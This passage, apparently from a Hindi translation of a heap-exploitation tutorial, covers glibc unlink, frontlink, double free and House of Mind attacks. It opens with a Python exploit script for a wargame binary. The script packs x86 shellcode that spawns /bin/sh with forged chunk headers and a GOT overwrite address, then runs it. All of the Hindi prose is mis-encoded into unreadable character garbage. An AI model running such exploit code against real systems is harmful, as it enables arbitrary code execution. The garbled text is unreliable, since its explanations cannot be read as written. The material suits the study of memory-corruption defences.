‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

‡§π‡§Æ 3 ‡§≤‡§ó‡§æ‡§§‡§æ‡§∞ ‡§ü‡•Å‡§ï‡§°‡§º‡•ã‡§Ç ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§ï‡•ç‡§∞‡§Æ ‡§Æ‡•á‡§Ç ‡§â‡§≤‡§ü ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç:

‡§ü‡•Å‡§ï‡§°‡§º‡§æ c ‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§ü‡•Å‡§ï‡§°‡§º‡§æ a ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§π‡§Æ b ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø size ‡§Æ‡•á‡§Ç PREV\_INUSE ‡§¨‡§ø‡§ü ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§∏‡•ã‡§ö‡•á ‡§ï‡§ø ‡§ü‡•Å‡§ï‡§°‡§º‡§æ a ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§π‡§Æ b ‡§ï‡•á ‡§π‡•á‡§°‡§∞ ‡§Æ‡•á‡§Ç size ‡§ï‡•ã -4 ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§Ø‡§π ‡§∏‡•ã‡§ö‡•á‡§ó‡§æ ‡§ï‡§ø ‚Äúa‚Äù ‡§´‡•ç‡§∞‡•Ä ‡§π‡•à ‡§î‡§∞ ‡§è‡§ï ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§π unlink() ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§§‡§æ‡§ï‡§ø ‡§á‡§∏‡•á ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§π‡•á‡§°‡§∞ PREV\_SIZE -4 ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡•ã‡§ö‡•á‡§ó‡§æ ‡§ï‡§ø ‚Äúa‚Äù ‡§ï‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç b+4 ‡§Æ‡•á‡§Ç ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, ‡§Ø‡§π unlink() ‡§ï‡•ã b+4 ‡§Æ‡•á‡§Ç ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§™‡§∞ ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è b+12 ‡§Æ‡•á‡§Ç ‚Äúfd‚Äù ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§π‡•ã‡§ó‡§æ ‡§î‡§∞ b+16 ‡§Æ‡•á‡§Ç ‚Äúbk‚Äù ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§π‡•ã‡§ó‡§æ‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§Ø‡§¶‡§ø ‡§π‡§Æ bk ‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ fd ‡§Æ‡•á‡§Ç ‚Äúputs()‚Äù ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã -12 ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§π‡§Æ‡§æ‡§∞‡•á ‡§™‡§æ‡§∏ ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§™‡•á‡§≤‡•ã‡§° ‡§π‡•ã‡§ó‡§æ‡•§

**‡§´‡•ç‡§∞‡§Ç‡§ü‡§≤‡§ø‡§Ç‡§ï ‡§§‡§ï‡§®‡•Ä‡§ï**

‡§ú‡§¨ ‡§ï‡•Å‡§õ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡§ï‡•á ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§Ü‡§∏‡§®‡•ç‡§® ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§´‡•ç‡§∞‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§á‡§∏‡•á ‡§´‡•ç‡§∞‡§Ç‡§ü‡§≤‡§ø‡§Ç‡§ï ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, unlink() ‡§ï‡•ã ‡§®‡§π‡•Ä‡§Ç ‡§¨‡•Å‡§≤‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§¨‡§≤‡•ç‡§ï‡§ø ‡§∏‡•Ä‡§ß‡•á frontlink() ‡§ï‡•ã ‡§¨‡•Å‡§≤‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§π ‡§§‡§¨ ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ malloc ‡§ï‡§≠‡•Ä ‡§≠‡•Ä ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ (free())‡•§

‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ‡§è‡§Å:

‡§è‡§ï ‡§¨‡§´‡§∞ ‡§ú‡•ã ‡§°‡•á‡§ü‡§æ ‡§á‡§®‡§™‡•Å‡§ü ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§π‡•ã ‡§∏‡§ï‡•á‡•§

‡§è‡§ï ‡§¨‡§´‡§∞ ‡§ú‡•ã ‡§á‡§∏‡§ï‡•á ‡§¨‡§ó‡§≤ ‡§Æ‡•á‡§Ç ‡§π‡•ã ‡§ú‡§ø‡§∏‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§î‡§∞ ‡§ú‡§ø‡§∏‡§ï‡•á ‡§π‡•á‡§°‡§∞ ‡§ï‡•á fd ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§ï‡•ã ‡§™‡§ø‡§õ‡§≤‡•á ‡§¨‡§´‡§∞ ‡§ï‡•á ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§è‡§ï ‡§¨‡§´‡§∞ ‡§ú‡§ø‡§∏‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ 512 ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§≤‡•á‡§ï‡§ø‡§® ‡§™‡§ø‡§õ‡§≤‡•á ‡§¨‡§´‡§∞ ‡§∏‡•á ‡§õ‡•ã‡§ü‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§è‡§ï ‡§¨‡§´‡§∞ ‡§ú‡•ã ‡§§‡•Ä‡§∏‡§∞‡•á ‡§ö‡§∞‡§£ ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§ò‡•ã‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã ‡§ú‡•ã ‡§á‡§∏ prev\_size ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•ã‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§¶‡•ã mallocs ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§è‡§ï ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã‡§ï‡§∞, ‡§π‡§Æ ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§°‡§¨‡§≤ ‡§´‡•ç‡§∞‡•Ä() ‡§ï‡•Ä ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ**

‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§π‡•Ä ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• free() ‡§ï‡•ã ‡§¶‡•ã ‡§¨‡§æ‡§∞ ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§¶‡•ã ‡§¨‡§ø‡§® ‡§è‡§ï ‡§π‡•Ä ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§Ø‡§¶‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§¨‡§ø‡§®‡§æ ‡§ï‡§ø‡§∏‡•Ä ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ ‡§ï‡•á ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§Ø‡§¶‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§â‡§∏‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡§Æ‡§æ‡§∞‡•á ‡§™‡§æ‡§∏ ‚Äúfd‚Äù ‡§î‡§∞ ‚Äúbk‚Äù ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§π‡•ã‡§Ç‡§ó‡•á ‡§ú‡•ã ‡§™‡§ø‡§õ‡§≤‡•á ‡§Ü‡§µ‡§Ç‡§ü‡§® ‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ù‡•Ç‡§†‡•á ‡§π‡•ã‡§Ç‡§ó‡•á‡•§

**‡§´‡•ç‡§∞‡•Ä() ‡§ï‡•á ‡§¨‡§æ‡§¶**

‡§è‡§ï ‡§™‡§π‡§≤‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§¨‡§ø‡§®‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§ï‡•á ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

## **8 ‡§π‡•Ä‡§™ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã: ‡§â‡§®‡•ç‡§®‡§§ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü**

unlink() ‡§î‡§∞ FrontLink() ‡§ï‡•Ä ‡§§‡§ï‡§®‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡•ã unlink() ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ‡•§

**‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§Æ‡§æ‡§á‡§Ç‡§°**

‡§ï‡•ã‡§° ‡§ï‡•ã ‡§Æ‡§®‡§Æ‡§æ‡§®‡•á ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï free() ‡§ï‡•â‡§≤ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ ‡§è‡§ï ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•Ä ‡§§‡§≤‡§æ‡§∂ ‡§ï‡§∞‡§®‡§æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§è‡§ï ‡§™‡•Ç‡§∞‡•ç‡§µ‡§µ‡§∞‡•ç‡§§‡•Ä ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§è‡§ï free() ‡§ï‡•â‡§≤ public\_fREe(mem) ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§ï‡§æ‡§∞‡§£ ‡§¨‡§®‡§§‡•Ä ‡§π‡•à, ‡§Ø‡§π ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mem); ‚Äî> ‡§µ‡§π ‡§™‡§§‡§æ ‡§≤‡•å‡§ü‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Ç ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

\[1] ‡§Æ‡•á‡§Ç, ‡§Ø‡§π size ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§ï‡•ã NON\_MAIN\_ARENA ‡§¨‡§ø‡§ü ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡•á ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ú‡§æ‡§Ç‡§ö ‡§∏‡§§‡•ç‡§Ø ‡§≤‡•å‡§ü‡§æ‡§è ‡§î‡§∞ heap\_for\_ptr() ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è, ‡§ú‡•ã ‚Äúmem‚Äù ‡§™‡§∞ ‡§è‡§ï ‡§î‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á 2.5 ‡§∏‡§¨‡§∏‡•á ‡§ï‡§Æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ 0 ‡§π‡•ã ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç (‡§π‡§Æ‡§æ‡§∞‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç 0x0804a000 ‡§∏‡•á 0x08000000 ‡§õ‡•ã‡§°‡§º‡§§‡§æ ‡§π‡•à) ‡§î‡§∞ 0x08000000->ar\_ptr (‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï struct heap\_info ‡§π‡•ã) ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§Ø‡§¶‡§ø ‡§π‡§Æ 0x0804a000 ‡§™‡§∞ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ 0x081002a0 ‡§™‡§∞ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§π‡§Æ 0x08100000 ‡§™‡§§‡•á ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§ú‡•ã ‡§ö‡§æ‡§π‡•á‡§Ç ‡§≤‡§ø‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø **0x0804a000**‡•§ ‡§ú‡§¨ ‡§Ø‡§π ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§™‡§æ‡§è‡§ó‡§æ ‡§ï‡§ø heap\_for\_ptr(ptr)->ar\_ptr 0x08100000 ‡§Æ‡•á‡§Ç ‡§ú‡•ã ‡§π‡§Æ‡§®‡•á ‡§≤‡§ø‡§ñ‡§æ ‡§π‡•à, ‡§â‡§∏‡•á ‡§≤‡•å‡§ü‡§æ‡§§‡§æ ‡§π‡•à (‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§™‡§π‡§≤‡•á ‡§¶‡•á‡§ñ‡•á ‡§ó‡§è ‡§î‡§∞ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§î‡§∞ ‡§µ‡§π‡§æ‡§Ç ‡§∏‡•á ‡§™‡§π‡§≤‡•á 4 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§®‡§ø‡§ï‡§æ‡§≤‡§æ ‡§ó‡§Ø‡§æ, ar\_ptr)‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, \_int\_free(ar\_ptr, mem) ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§π‡§Æ‡§®‡•á ‡§™‡§π‡§≤‡•á ‡§¶‡•á‡§ñ‡§æ, ‡§π‡§Æ av ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§π‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§π‡§Æ ‡§â‡§∏ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø unsorted\_chunks ‡§ï‡•ã ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§π‡§Æ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§¶‡§ø ‡§π‡§Æ av->bins\[2] ‡§Æ‡•á‡§Ç __DTOR\_END\_-12 ‡§ï‡§æ ‡§Æ‡§æ‡§® ‡§≤‡§ø‡§ñ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§Æ‡•á‡§Ç __DTOR\_END\_ ‡§Æ‡•á‡§Ç ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ø‡§ñ‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§Ö‡§∞‡•ç‡§•‡§æ‡§§, ‡§™‡§π‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡•á‡§Ç ‡§∂‡•Å‡§∞‡•Å‡§Ü‡§§ ‡§Æ‡•á‡§Ç ‡§ï‡§à ‡§¨‡§æ‡§∞ __DTOR\_END\_-12 ‡§ï‡§æ ‡§™‡§§‡§æ ‡§°‡§æ‡§≤‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø av->bins\[2] ‡§á‡§∏‡•á ‡§®‡§ø‡§ï‡§æ‡§≤‡•á‡§ó‡§æ‡•§

